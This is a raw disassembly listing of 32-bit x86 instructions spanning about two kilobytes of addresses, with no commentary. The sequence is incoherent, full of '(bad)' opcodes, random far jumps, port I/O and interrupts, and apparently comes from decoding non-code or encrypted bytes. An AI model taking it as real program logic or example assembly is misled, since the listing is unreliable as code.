  40af79:	xchg   BYTE PTR [ecx+0x66],dh
  40af7c:	mov    ds:0xbb13b1d6,eax
  40af81:	jo     0x40afde
  40af83:	aam    0x9b
  40af85:	les    edi,FWORD PTR [ebx]
  40af87:	sbb    BYTE PTR [eax+0x34],bl
  40af8a:	sub    al,0x33
  40af8c:	std    
  40af8d:	out    0x43,al
  40af8f:	or     eax,0x5578ee3f
  40af94:	test   BYTE PTR cs:[edi-0x6a],bl
  40af98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af99:	mov    ebx,0x3e8b4269
  40af9e:	ds ror bl,0xee
  40afa2:	jo     0x40af38
  40afa4:	into   
  40afa5:	add    al,0xf8
  40afa7:	push   0x1e1e490a
  40afac:	jg     0xbb1ac0e6
  40afb2:	aam    0xe3
  40afb4:	mov    eax,0xac0dcefb
  40afb9:	enter  0x66a3,0xda
  40afbd:	cmp    ebx,DWORD PTR [esi-0x6f]
  40afc0:	mov    edi,DWORD PTR [edi]
  40afc2:	(bad)  
  40afc3:	jmp    0x40afa7
  40afc5:	les    esi,FWORD PTR [esi+0x1b]
  40afc8:	lods   al,BYTE PTR ds:[esi]
  40afc9:	or     esp,DWORD PTR [eax+0x69503ecc]
  40afcf:	xchg   ebx,eax
  40afd0:	(bad)  [edx]
  40afd2:	push   0x1025bc5a
  40afd7:	aam    0xd0
  40afd9:	jmp    0x40afad
  40afdb:	mov    bh,0xda
  40afdd:	outs   dx,DWORD PTR ds:[esi]
  40afde:	clc    
  40afdf:	push   ss
  40afe0:	mov    BYTE PTR [ecx+0xbb0ada1],ch
  40afe6:	dec    eax
  40afe7:	xor    dh,BYTE PTR [ebx+0x2c2f7dc9]
  40afed:	bnd jo 0x40b03d
  40aff0:	test   DWORD PTR [edi],edx
  40aff2:	mov    esi,esi
  40aff4:	mov    DWORD PTR [edx+0x678c5282],esi
  40affa:	(bad)  
  40affb:	shl    DWORD PTR [eax],0x82
  40affe:	cmp    al,0x69
  40b000:	js     0x40b06e
  40b002:	and    esp,DWORD PTR [edx-0x25d382d2]
  40b008:	xchg   esp,eax
  40b009:	mov    edx,0x350c730
  40b00e:	inc    eax
  40b00f:	cmc    
  40b010:	jno    0x40b08b
  40b012:	outs   dx,BYTE PTR ds:[esi]
  40b013:	pop    eax
  40b014:	lock cdq 
  40b016:	cmp    al,0x3c
  40b018:	dec    ebx
  40b019:	das    
  40b01a:	enter  0xc97a,0xa1
  40b01e:	xchg   ecx,eax
  40b01f:	dec    ebx
  40b020:	js     0x40b080
  40b022:	mov    ch,0x1
  40b024:	loopne 0x40afcd
  40b026:	jno    0x40b092
  40b028:	in     eax,dx
  40b029:	and    BYTE PTR [esi+0x5f],0xb8
  40b02d:	rcr    BYTE PTR [ebp-0x33],0x44
  40b031:	sbb    eax,0xe68d5560
  40b036:	xor    DWORD PTR [ecx],ecx
  40b038:	cmp    cl,bh
  40b03a:	out    0xdf,al
  40b03c:	mov    ch,0xb0
  40b03e:	rol    ch,0x88
  40b041:	int    0xdc
  40b043:	or     BYTE PTR [eax+0x2c],0x95
  40b047:	push   edx
  40b048:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b049:	sub    dh,BYTE PTR [eax]
  40b04b:	mov    eax,0xb2290925
  40b050:	mov    ah,0xba
  40b052:	aad    0x93
  40b054:	jmp    0x34ae:0x8a31e64d
  40b05b:	or     eax,0xc0af6bbc
  40b060:	pop    eax
  40b061:	cmp    esi,DWORD PTR ds:0xc2463204
  40b067:	fstp   TBYTE PTR [esi]
  40b069:	out    0xa3,eax
  40b06b:	pop    edx
  40b06c:	cli    
  40b06d:	rcl    al,0xb4
  40b070:	dec    edx
  40b071:	dec    ebx
  40b072:	sbb    al,0x9d
  40b074:	out    0x4,eax
  40b076:	xor    ebx,DWORD PTR [edx+esi*2+0x179eb04]
  40b07d:	and    edx,DWORD PTR [edx-0x4a2346ef]
  40b083:	das    
  40b084:	lds    ecx,FWORD PTR [esi+0x54]
  40b087:	jmp    0xfe23:0x550c0cc2
  40b08e:	cmp    al,0x1e
  40b090:	mov    ecx,0xd34cdd73
  40b095:	sbb    eax,0xd94d3318
  40b09a:	(bad)  
  40b09b:	(bad)  
  40b09c:	dec    ebp
  40b09d:	pop    ds
  40b09e:	scas   al,BYTE PTR es:[edi]
  40b09f:	mov    edx,DWORD PTR [ebx-0x11]
  40b0a2:	sub    edx,edx
  40b0a4:	aam    0xd3
  40b0a6:	xchg   edi,eax
  40b0a7:	jnp    0x40b054
  40b0a9:	jnp    0x40b110
  40b0ab:	xor    BYTE PTR [edx+0x544a46be],cl
  40b0b1:	aaa    
  40b0b2:	push   edx
  40b0b3:	sub    eax,0xc60f46da
  40b0b8:	and    al,BYTE PTR [ecx-0x62081ddb]
  40b0be:	ins    DWORD PTR es:[edi],dx
  40b0bf:	retf   0x7df0
  40b0c2:	inc    ebx
  40b0c3:	aad    0xff
  40b0c5:	imul   esi,DWORD PTR [eax],0x1042bc39
  40b0cb:	pop    ds
  40b0cc:	or     eax,0x3452a67b
  40b0d1:	mov    esi,0x2c66edd8
  40b0d6:	test   eax,0x319fa73b
  40b0db:	mov    edi,0x3053b64e
  40b0e0:	dec    ebx
  40b0e1:	(bad)  
  40b0e2:	cmp    al,cl
  40b0e4:	push   ds
  40b0e5:	pop    ebx
  40b0e6:	push   esp
  40b0e7:	mov    ds:0x9b8c09c5,al
  40b0ec:	jae    0x40b15a
  40b0ee:	jne    0x40b0d5
  40b0f0:	retf   0xe004
  40b0f3:	add    al,0x26
  40b0f5:	cmp    DWORD PTR [ebp+0x383af854],0xffffff97
  40b0fc:	mov    bl,BYTE PTR [eax-0x6f]
  40b0ff:	cli    
  40b100:	iret   
  40b101:	pop    esi
  40b102:	lahf   
  40b103:	and    al,BYTE PTR [edi+esi*1+0x4e2a18ef]
  40b10a:	std    
  40b10b:	aad    0xe7
  40b10d:	cdq    
  40b10e:	cli    
  40b10f:	cld    
  40b110:	sub    ecx,DWORD PTR [ebp-0x27]
  40b113:	data16 ins BYTE PTR es:[edi],dx
  40b115:	mov    dl,0x34
  40b117:	dec    esi
  40b118:	loopne 0x40b0c6
  40b11a:	mov    ds:0x7caefada,eax
  40b11f:	jmp    0xf86a5d80
  40b124:	ficomp WORD PTR [ebx]
  40b126:	xor    BYTE PTR ds:0xf1eab79f,cl
  40b12c:	pop    esi
  40b12d:	out    dx,eax
  40b12e:	(bad)  
  40b12f:	fidiv  WORD PTR [ebp+ebp*1+0x23]
  40b133:	lea    edi,[edx]
  40b135:	push   ebp
  40b136:	and    al,0x40
  40b138:	mov    ecx,0x2628507d
  40b13d:	add    eax,0xae92d039
  40b142:	arpl   WORD PTR [edx+eiz*8+0x1d],bx
  40b146:	xor    BYTE PTR [esi+esi*1],ch
  40b149:	das    
  40b14a:	fwait
  40b14b:	loopne 0x40b1ba
  40b14d:	iret   
  40b14e:	ds sahf 
  40b150:	mov    ds:0xc8be1aa7,eax
  40b155:	ja     0x40b101
  40b157:	xor    BYTE PTR [eax-0x2b],bh
  40b15a:	pusha  
  40b15b:	inc    esp
  40b15c:	imul   eax,DWORD PTR [ecx+esi*1-0x21],0x52
  40b161:	test   BYTE PTR [esi],ch
  40b163:	cld    
  40b164:	fist   DWORD PTR ds:0x9a6fb73e
  40b16a:	pop    ebx
  40b16b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b16c:	(bad)  
  40b16d:	jmp    0xb3d7:0x5fb336f8
  40b174:	in     eax,0x72
  40b176:	dec    ecx
  40b177:	aad    0x8b
  40b179:	mov    eax,ds:0x2b2386c1
  40b17e:	jmp    0xba5b72cf
  40b183:	lea    edx,[edi+0x3235242d]
  40b189:	sub    eax,0xdc606e2a
  40b18e:	stos   DWORD PTR es:[edi],eax
  40b18f:	jg     0x40b13d
  40b191:	mov    bl,0xd6
  40b193:	rcl    DWORD PTR [esi],cl
  40b195:	aad    0xc2
  40b197:	fptan  
  40b199:	lods   eax,DWORD PTR ss:[esi]
  40b19b:	ins    DWORD PTR es:[edi],dx
  40b19c:	fwait
  40b19d:	mov    BYTE PTR ds:0xd5ed6188,ch
  40b1a3:	jnp    0x40b16c
  40b1a5:	(bad)  
  40b1a6:	ss jl  0x40b1ff
  40b1a9:	in     al,0xb6
  40b1ab:	in     eax,0x63
  40b1ad:	or     DWORD PTR [esi+0x56],0x4b
  40b1b1:	icebp  
  40b1b2:	push   edi
  40b1b3:	cmp    al,0xf7
  40b1b5:	out    0x16,al
  40b1b7:	mov    ch,0x20
  40b1b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1ba:	mov    bh,0x9c
  40b1bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1bd:	cmp    eax,0x659172fd
  40b1c2:	imul   edx
  40b1c4:	repnz mov ecx,0xa99da32a
  40b1ca:	test   cl,ch
  40b1cc:	leave  
  40b1cd:	mov    WORD PTR [edx],cs
  40b1cf:	xchg   ecx,eax
  40b1d0:	xchg   ecx,ebp
  40b1d2:	punpckhbw mm4,QWORD PTR [edx]
  40b1d5:	les    ecx,FWORD PTR [esi+0x1776140b]
  40b1db:	pop    ss
  40b1dc:	shl    BYTE PTR [eax-0x7ceb3ca6],0x43
  40b1e3:	pop    esp
  40b1e4:	xchg   DWORD PTR [edi+esi*8+0x19f14f79],edi
  40b1eb:	and    BYTE PTR [ebx+0x6449a6ce],bh
  40b1f1:	aam    0xc4
  40b1f3:	mov    ch,0x30
  40b1f5:	xor    DWORD PTR [esi],edi
  40b1f7:	mov    esi,0xc3474a63
  40b1fc:	xchg   esp,eax
  40b1fd:	(bad)  
  40b1fe:	pop    ebx
  40b1ff:	adc    DWORD PTR [edi],ebp
  40b201:	push   0x874ad061
  40b206:	enter  0xf885,0x49
  40b20a:	mov    DWORD PTR [edi-0x4c08640c],edx
  40b210:	cwde   
  40b211:	cmc    
  40b212:	inc    esp
  40b213:	sbb    edx,DWORD PTR [edx]
  40b215:	mov    al,ds:0xed882870
  40b21a:	aas    
  40b21b:	inc    eax
  40b21c:	jbe    0x40b21e
  40b21e:	xor    al,0x91
  40b220:	inc    edi
  40b221:	in     eax,0xa
  40b223:	pop    edx
  40b224:	push   ebx
  40b225:	loopne 0x40b1e9
  40b227:	das    
  40b228:	and    bh,BYTE PTR [ecx-0x772f02ff]
  40b22e:	dec    esp
  40b22f:	push   esi
  40b231:	pop    ebp
  40b232:	mov    bl,0xe7
  40b234:	xor    DWORD PTR [ebp+0x5a],esp
  40b237:	dec    ebp
  40b238:	dec    ecx
  40b239:	jp     0x40b279
  40b23b:	fadd   DWORD PTR [edi]
  40b23d:	pop    ebp
  40b23e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b23f:	out    dx,eax
  40b240:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b241:	sar    BYTE PTR [edx+0x7c],cl
  40b244:	cld    
  40b245:	add    eax,0x24b577ac
  40b24a:	fnstenv [ebx+0x28fb74fd]
  40b250:	into   
  40b251:	sar    BYTE PTR [edi+0x1fae5bde],0xa7
  40b258:	push   esp
  40b259:	dec    esi
  40b25a:	lods   al,BYTE PTR ds:[esi]
  40b25b:	xlat   BYTE PTR ds:[ebx]
  40b25c:	mov    ds:0xe894c62a,eax
  40b261:	scas   eax,DWORD PTR es:[edi]
  40b262:	rsqrtps xmm1,XMMWORD PTR [esi]
  40b265:	aam    0x24
  40b267:	test   dl,bl
  40b269:	dec    esi
  40b26a:	sbb    dh,BYTE PTR [ecx]
  40b26c:	pushf  
  40b26d:	add    dh,BYTE PTR [eax+0x52208255]
  40b273:	pop    ebp
  40b274:	mov    eax,ss:0x6c1be2a4
  40b27a:	jmp    0xf57a:0x1e65e901
  40b281:	call   0xb9fd:0xec9666a5
  40b288:	cmp    ebp,edi
  40b28a:	mov    ebp,0x292ed499
  40b28f:	int    0x39
  40b291:	ret    0x717a
  40b294:	mov    ?,WORD PTR [ecx+0x74e63a79]
  40b29a:	cmp    DWORD PTR [esi+0x25],esp
  40b29d:	mov    esp,DWORD PTR [edi*4-0x6d8cb1b0]
  40b2a4:	dec    ecx
  40b2a5:	inc    ecx
  40b2a6:	inc    ecx
  40b2a7:	pop    ss
  40b2a8:	xchg   edx,eax
  40b2a9:	(bad)  
  40b2aa:	xor    al,0x90
  40b2ac:	icebp  
  40b2ad:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2af:	sub    BYTE PTR [eax-0x6d9e7eb],bl
  40b2b5:	out    dx,al
  40b2b6:	daa    
  40b2b7:	fdivr  QWORD PTR [esi]
  40b2b9:	pushf  
  40b2ba:	mov    edi,0xdc264212
  40b2bf:	stc    
  40b2c0:	pop    edi
  40b2c1:	mov    al,0xdd
  40b2c3:	push   esi
  40b2c4:	and    ebp,edi
  40b2c6:	adc    eax,0x38911729
  40b2cb:	sub    bl,al
  40b2cd:	dec    ebp
  40b2ce:	daa    
  40b2cf:	shl    BYTE PTR [esi-0x4a],cl
  40b2d2:	out    dx,eax
  40b2d3:	(bad)  
  40b2d4:	mov    bh,0x8f
  40b2d6:	inc    esi
  40b2d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2d8:	inc    esi
  40b2d9:	pusha  
  40b2da:	jno    0x40b30d
  40b2dc:	mov    al,ds:0xf3423427
  40b2e1:	ins    BYTE PTR es:[edi],dx
  40b2e2:	pop    ebx
  40b2e3:	sub    ecx,DWORD PTR [esi+0x50]
  40b2e6:	sbb    eax,0x70949598
  40b2eb:	or     BYTE PTR [eax-0x2d4c95d8],bl
  40b2f1:	jne    0x40b2be
  40b2f3:	test   BYTE PTR [ebp+0x7d04252a],dh
  40b2f9:	xchg   edx,eax
  40b2fa:	dec    ebx
  40b2fb:	cdq    
  40b2fc:	imul   ebx,DWORD PTR [edi-0x79],0xa6ba2495
  40b303:	xor    DWORD PTR [ebp-0x70],edx
  40b306:	mov    ds:0x59818ab3,eax
  40b30b:	out    dx,eax
  40b30c:	add    eax,0x840d2851
  40b311:	std    
  40b312:	iret   
  40b313:	loop   0x40b34c
  40b315:	mov    ecx,0x1c3fea0f
  40b31a:	pop    ebx
  40b31b:	xor    BYTE PTR [eax+0xcbfa15f],cl
  40b321:	jo     0x40b356
  40b323:	adc    BYTE PTR [ebx-0x31],dl
  40b326:	stos   BYTE PTR es:[edi],al
  40b327:	jg     0x40b358
  40b329:	xchg   ebx,eax
  40b32a:	cmp    BYTE PTR [ebp-0x1501551b],ch
  40b330:	push   ecx
  40b331:	push   ds
  40b332:	mov    ?,WORD PTR [edi-0x28]
  40b335:	out    dx,al
  40b336:	push   ebp
  40b337:	loope  0x40b310
  40b339:	rol    ebx,0x93
  40b33c:	xlat   BYTE PTR ds:[ebx]
  40b33d:	js     0x40b396
  40b33f:	mov    eax,ds:0xba815a9f
  40b344:	and    ah,al
  40b346:	arpl   bx,bp
  40b348:	mov    esp,0x2e8791ce
  40b34d:	cs jecxz 0x40b354
  40b350:	stc    
  40b351:	or     BYTE PTR ds:0x5a772138,cl
  40b357:	xchg   edx,eax
  40b358:	lahf   
  40b359:	mov    edi,0xce51b96c
  40b35e:	xor    DWORD PTR [ecx+ebp*8+0x679d2c3b],esi
  40b365:	(bad)  
  40b366:	xchg   dl,dl
  40b368:	mov    DWORD PTR [eax-0x52],esi
  40b36b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b36c:	xchg   esi,eax
  40b36d:	int    0xbd
  40b36f:	jb     0x40b35e
  40b371:	pop    eax
  40b372:	and    DWORD PTR [edx-0x7d],0xc1abcec3
  40b379:	sub    eax,0x4bed1f9f
  40b37e:	cmp    eax,0xee3c15a4
  40b383:	cmp    ch,BYTE PTR [edi+0x67e1a7d8]
  40b389:	(bad)  [eax-0x4d1a2ced]
  40b38f:	call   0x717bec4b
  40b394:	inc    ebx
  40b395:	cli    
  40b396:	(bad)  
  40b397:	ss sub al,cl
  40b39a:	shl    dh,cl
  40b39c:	xor    DWORD PTR [ecx],ebp
  40b39e:	out    dx,eax
  40b39f:	scas   eax,DWORD PTR es:[edi]
  40b3a0:	adc    DWORD PTR ds:0xc7c0887a,esi
  40b3a6:	jae    0x40b33d
  40b3a8:	shl    BYTE PTR [eax+edi*2],1
  40b3ab:	ins    BYTE PTR es:[edi],dx
  40b3ac:	sti    
  40b3ad:	xchg   ecx,eax
  40b3ae:	out    dx,al
  40b3af:	loopne 0x40b3f2
  40b3b1:	test   DWORD PTR ds:0x957df94a,edx
  40b3b7:	not    DWORD PTR [eax+eiz*8+0x42d108c9]
  40b3be:	sbb    edx,DWORD PTR [ebx+0x3]
  40b3c1:	cmp    eax,0x740343b
  40b3c6:	or     DWORD PTR [edi+eax*8],esp
  40b3c9:	int    0xef
  40b3cb:	mov    BYTE PTR [ecx+ebx*1-0x54],al
  40b3cf:	mov    bl,0xa4
  40b3d1:	(bad)  
  40b3d3:	push   0xbd6f3caf
  40b3d8:	out    dx,eax
  40b3d9:	lds    ecx,FWORD PTR [edi+esi*2]
  40b3dc:	xchg   ebx,eax
  40b3dd:	or     al,0xea
  40b3df:	sbb    al,0xba
  40b3e1:	and    DWORD PTR [edi],ebx
  40b3e3:	dec    edx
  40b3e4:	inc    esp
  40b3e5:	test   al,0x47
  40b3e7:	pop    eax
  40b3e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3e9:	dec    esp
  40b3ea:	pop    ecx
  40b3eb:	sub    eax,0xc24d8a29
  40b3f0:	pop    DWORD PTR [ebp+0x6c]
  40b3f3:	mov    ss,WORD PTR [eax-0x6d]
  40b3f6:	cmp    BYTE PTR [edx],dh
  40b3f8:	mov    eax,0xf5199819
  40b3fd:	pop    ds
  40b3fe:	xchg   edi,eax
  40b3ff:	sbb    cl,0x4e
  40b402:	xchg   ebx,eax
  40b403:	int3   
  40b404:	add    ch,cl
  40b406:	scas   eax,DWORD PTR es:[edi]
  40b407:	out    dx,eax
  40b408:	cmp    DWORD PTR [ecx+0x22],edi
  40b40b:	iret   
  40b40c:	int    0x3e
  40b40e:	out    dx,eax
  40b40f:	pop    edx
  40b410:	cmp    esp,esi
  40b412:	add    esp,ebx
  40b414:	mov    ah,0x2c
  40b416:	mov    esi,0x4ddb6992
  40b41b:	jecxz  0x40b460
  40b41d:	ja     0x40b430
  40b41f:	dec    ebp
  40b420:	pop    ebx
  40b421:	or     BYTE PTR [ecx],ah
  40b423:	je     0x40b41c
  40b425:	fs gs (bad) 
  40b428:	push   esp
  40b429:	add    BYTE PTR [esi-0x588a11ec],al
  40b42f:	inc    ecx
  40b430:	pop    ecx
  40b431:	or     BYTE PTR ds:0x4fe8e6d7,dl
  40b437:	sbb    DWORD PTR ds:0xd49e0d00,eax
  40b43d:	and    bh,bl
  40b43f:	xchg   esp,eax
  40b440:	ins    DWORD PTR es:[edi],dx
  40b441:	cmp    ebp,DWORD PTR [eax-0xa57f96]
  40b447:	or     eax,0xff99ab89
  40b44c:	sar    BYTE PTR [ecx],1
  40b44e:	or     eax,ecx
  40b450:	inc    esp
  40b451:	or     eax,0xd0e645c4
  40b456:	cmp    esi,DWORD PTR [ebx-0x74]
  40b459:	cbw    
  40b45b:	xor    BYTE PTR [ebx+ebp*4-0x1923da13],al
  40b462:	dec    esi
  40b463:	cmc    
  40b464:	pop    DWORD PTR [eax+0x1de31476]
  40b46a:	cmp    bl,al
  40b46c:	inc    eax
  40b46d:	stos   DWORD PTR es:[edi],eax
  40b46e:	ja     0x40b432
  40b470:	lds    esi,FWORD PTR [esi]
  40b472:	sbb    al,0x5f
  40b474:	and    al,0xa3
  40b476:	or     BYTE PTR [eax-0x4],dh
  40b479:	mov    al,0xa8
  40b47b:	xchg   ecx,eax
  40b47c:	jne    0x40b4b1
  40b47e:	sar    esp,0x3e
  40b481:	adc    BYTE PTR [ebx+0x1fd492fc],0x6b
  40b488:	shl    ch,1
  40b48a:	mov    ah,0xf5
  40b48c:	adc    cl,BYTE PTR [esi-0x11639a7]
  40b492:	add    DWORD PTR [edx-0xb59df08],0xffffff90
  40b499:	and    eax,0x5a8b4534
  40b49e:	nop
  40b49f:	adc    edx,ebx
  40b4a1:	cmp    BYTE PTR [edi-0x1bfa68bf],al
  40b4a7:	inc    esp
  40b4a8:	add    DWORD PTR [ebp+0x7c],0x2a6d494c
  40b4af:	dec    edx
  40b4b0:	xchg   BYTE PTR [edx+0x5cd07c4],bh
  40b4b6:	test   DWORD PTR [edx-0x22],0xdde1da2b
  40b4bd:	aam    0xc0
  40b4bf:	xor    ah,BYTE PTR [edx+0x6857d677]
  40b4c5:	mov    WORD PTR [ebp+0x8],?
  40b4c8:	adc    al,0xf1
  40b4ca:	jmp    0x6b91daf1
  40b4cf:	iret   
  40b4d0:	sub    DWORD PTR [edx+eax*1],ebx
  40b4d3:	das    
  40b4d4:	mov    dh,0x8
  40b4d6:	aad    0x5
  40b4d8:	fbld   TBYTE PTR [ecx-0x1fcaf6e3]
  40b4de:	repz xlat BYTE PTR ds:[ebx]
  40b4e0:	aas    
  40b4e1:	sar    DWORD PTR [esp+ebx*2],cl
  40b4e4:	and    al,0xed
  40b4e6:	push   0xffffffc8
  40b4e8:	mov    WORD PTR [edx-0x5a],?
  40b4eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4ec:	or     al,0x3e
  40b4ee:	dec    ebp
  40b4ef:	mov    ds:0x8a647b9a,al
  40b4f4:	out    0x90,al
  40b4f6:	mov    BYTE PTR [ecx],al
  40b4f8:	mov    al,ds:0x6d50a79f
  40b4fd:	jne    0x40b4d8
  40b4ff:	xchg   ebp,eax
  40b500:	iret   
  40b501:	into   
  40b502:	sub    edx,esi
  40b504:	icebp  
  40b505:	(bad)  
  40b506:	dec    ebp
  40b507:	int3   
  40b508:	shl    BYTE PTR [ecx],0xa1
  40b50b:	rol    dl,cl
  40b50d:	sbb    ecx,DWORD PTR [edx-0x5e]
  40b510:	mov    dh,0x6a
  40b512:	lods   al,BYTE PTR cs:[esi]
  40b514:	test   dl,dl
  40b516:	enter  0xd448,0xdc
  40b51a:	cld    
  40b51b:	inc    esp
  40b51c:	or     DWORD PTR [edi],eax
  40b51e:	je     0x40b529
  40b520:	(bad)  
  40b521:	dec    eax
  40b522:	add    DWORD PTR [edi+0x71642cac],ecx
  40b528:	xchg   esi,eax
  40b529:	fldcw  WORD PTR [edi-0x1d9dce15]
  40b52f:	test   eax,0x5518bdb7
  40b534:	data16 add al,0x16
  40b537:	popa   
  40b538:	and    al,0xc7
  40b53a:	bound  ecx,QWORD PTR [ebp+0x393d8a0b]
  40b540:	push   ebx
  40b541:	pop    esi
  40b542:	sti    
  40b543:	cmp    cl,0xe3
  40b546:	jg     0x40b57b
  40b548:	adc    eax,0x4565f71b
  40b54d:	imul   edi,DWORD PTR [edx],0x7230493c
  40b553:	mov    WORD PTR [edx+0x3b],cs
  40b556:	jle    0x40b53c
  40b558:	jmp    0xe75d7e03
  40b55d:	jge    0x40b5d3
  40b55f:	sahf   
  40b560:	fldenv [eax]
  40b562:	loopne 0x40b5a4
  40b564:	loope  0x40b566
  40b566:	pop    edx
  40b567:	push   ds
  40b568:	dec    ebp
  40b569:	ret    0x996b
  40b56c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b56d:	inc    edi
  40b56e:	push   edi
  40b56f:	fwait
  40b570:	sub    DWORD PTR [ebx-0x3a],0xf3b57a9c
  40b577:	cs xor al,0xc5
  40b57a:	inc    ebp
  40b57b:	push   eax
  40b57d:	fsub   QWORD PTR [esi]
  40b57f:	(bad)  
  40b580:	outs   dx,DWORD PTR ds:[esi]
  40b581:	xor    BYTE PTR [eax+0x11aa13be],dl
  40b587:	ja     0x40b5c3
  40b589:	push   0x7
  40b58b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b58c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b58d:	loope  0x40b529
  40b58f:	mov    eax,DWORD PTR [esi]
  40b591:	mov    bl,0xe7
  40b593:	ins    DWORD PTR es:[edi],dx
  40b594:	push   ss
  40b595:	lea    esp,[edx-0x241ce79c]
  40b59b:	jmp    0x650b:0x698d8b4a
  40b5a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5a3:	std    
  40b5a4:	xor    al,0xaa
  40b5a6:	imul   edi,DWORD PTR [esi-0x38],0x5b
  40b5aa:	push   cs
  40b5ab:	push   cs
  40b5ac:	sbb    BYTE PTR [eax],dl
  40b5ae:	push   ebx
  40b5af:	int3   
  40b5b0:	imul   ebx,DWORD PTR [eax],0xfffffffc
  40b5b3:	cli    
  40b5b4:	add    eax,0xe712e400
  40b5b9:	paddsb mm0,mm1
  40b5bc:	shl    BYTE PTR [ebx],1
  40b5be:	ins    BYTE PTR es:[edi],dx
  40b5bf:	arpl   si,ax
  40b5c1:	mov    ebx,0x1226fe27
  40b5c6:	push   ebp
  40b5c7:	mov    cl,0x91
  40b5c9:	jge    0x40b5c3
  40b5cb:	cmp    ah,ch
  40b5cd:	xor    al,0x2e
  40b5cf:	mov    eax,ds:0xc93c624b
  40b5d4:	mov    dl,0x82
  40b5d6:	lds    edx,FWORD PTR [edx+0x62740816]
  40b5dc:	psrlq  mm5,QWORD PTR [ebp-0x7f]
  40b5e0:	into   
  40b5e1:	xchg   esp,eax
  40b5e2:	jns    0x40b5d4
  40b5e4:	adc    eax,0x4ec6b0d1
  40b5e9:	push   ebx
  40b5ea:	add    al,0x2f
  40b5ec:	call   0x4a8f:0x288ef3b7
  40b5f3:	ja     0x40b632
  40b5f5:	call   0xf7e1:0x5fba9293
  40b5fc:	imul   edi,DWORD PTR [edx-0x5a],0xffffffa8
  40b600:	test   eax,0x52edaaf4
  40b605:	cmp    al,0x38
  40b607:	cmp    dl,dh
  40b609:	fwait
  40b60a:	or     edi,DWORD PTR [edx+0x15]
  40b60d:	int    0xbe
  40b60f:	in     al,0xba
  40b611:	(bad)  
  40b612:	mov    ebp,0x96de87fc
  40b617:	icebp  
  40b618:	jnp    0x40b60e
  40b61a:	mov    cl,0x5
  40b61c:	aaa    
  40b61d:	xor    dl,dh
  40b61f:	mov    al,ds:0x4be65d13
  40b624:	sbb    al,0x5a
  40b626:	loop   0x40b62e
  40b628:	fcomip st,st(5)
  40b62a:	xor    BYTE PTR [ecx],bl
  40b62c:	cli    
  40b62d:	or     edx,DWORD PTR [edx]
  40b62f:	popa   
  40b630:	in     eax,dx
  40b631:	inc    edi
  40b632:	fiadd  DWORD PTR [edi]
  40b634:	sbb    DWORD PTR ds:0x163af7f4,edi
  40b63a:	pop    edi
  40b63b:	cdq    
  40b63c:	sub    al,0x32
  40b63e:	cwde   
  40b63f:	sbb    ebx,DWORD PTR [edx+edi*1-0x1b295a57]
  40b646:	mov    ds:0xa22973b0,al
  40b64b:	xchg   edx,eax
  40b64c:	mov    DWORD PTR [ebx+0x2c2f99c],esi
  40b652:	cmp    DWORD PTR [ebx+0x4c6eb13b],0xdcc01cf5
  40b65c:	xor    dh,BYTE PTR [edx-0x7f]
  40b65f:	adc    BYTE PTR [edx+0x685c9f9e],0xda
  40b666:	dec    edi
  40b667:	xchg   esp,eax
  40b668:	or     dh,BYTE PTR [ebp+0x5cfea499]
  40b66e:	and    al,0x67
  40b670:	add    DWORD PTR [eax+edi*1-0x26ce8654],ecx
  40b677:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b678:	daa    
  40b679:	mov    cl,0x3f
  40b67b:	add    DWORD PTR [esi+0x1],eax
  40b67e:	inc    esi
  40b67f:	dec    ebp
  40b680:	call   0xab923936
  40b685:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b686:	imul   edx,DWORD PTR [esi+0x14],0xffffffa8
  40b68a:	aaa    
  40b68b:	pop    ebx
  40b68c:	xor    bl,ch
  40b68e:	dec    edi
  40b68f:	and    BYTE PTR [edi+0x20],0xb6
  40b693:	push   ss
  40b694:	and    eax,DWORD PTR [ebp+0x50165ffd]
  40b69a:	aad    0x25
  40b69c:	(bad)  
  40b69d:	leave  
  40b69e:	call   0x4e63:0x57ef015b
  40b6a5:	retf   0xdab2
  40b6a8:	sub    edi,DWORD PTR [edi]
  40b6aa:	add    BYTE PTR [ecx*2-0x3480849],dl
  40b6b1:	mov    ch,BYTE PTR [esi-0x78]
  40b6b4:	mov    esi,fs
  40b6b6:	pop    ss
  40b6b7:	mov    ebx,0x5c4e0268
  40b6bc:	sti    
  40b6bd:	push   edi
  40b6be:	aas    
  40b6bf:	jle    0x40b66f
  40b6c1:	loopne 0x40b6af
  40b6c3:	jecxz  0x40b6b7
  40b6c5:	or     eax,0x7335f570
  40b6ca:	mov    ds:0xbd4d6f28,al
  40b6cf:	inc    edi
  40b6d0:	inc    ebx
  40b6d1:	pop    edx
  40b6d2:	lahf   
  40b6d3:	rcl    BYTE PTR [edi],1
  40b6d5:	movups xmm3,xmm4
  40b6d8:	retf   0x4eec
  40b6db:	imul   ebp,DWORD PTR [ebx+0x51],0x8c5c407f
  40b6e2:	ret    0xe140
  40b6e5:	lahf   
  40b6e6:	xchg   ebx,eax
  40b6e7:	pop    ebx
  40b6e8:	sub    DWORD PTR [ecx-0x725d2d05],0x24
  40b6ef:	inc    eax
  40b6f0:	daa    
  40b6f1:	pop    ecx
  40b6f2:	adc    al,0x18
  40b6f4:	in     eax,dx
  40b6f5:	shr    ecx,1
  40b6f7:	stos   BYTE PTR es:[edi],al
  40b6f8:	nop
  40b6f9:	pushf  
  40b6fa:	dec    edx
  40b6fb:	inc    ecx
  40b6fc:	push   esp
  40b6fd:	or     DWORD PTR [ebp-0x51],ebp
  40b700:	popf   
  40b701:	stos   BYTE PTR es:[edi],al
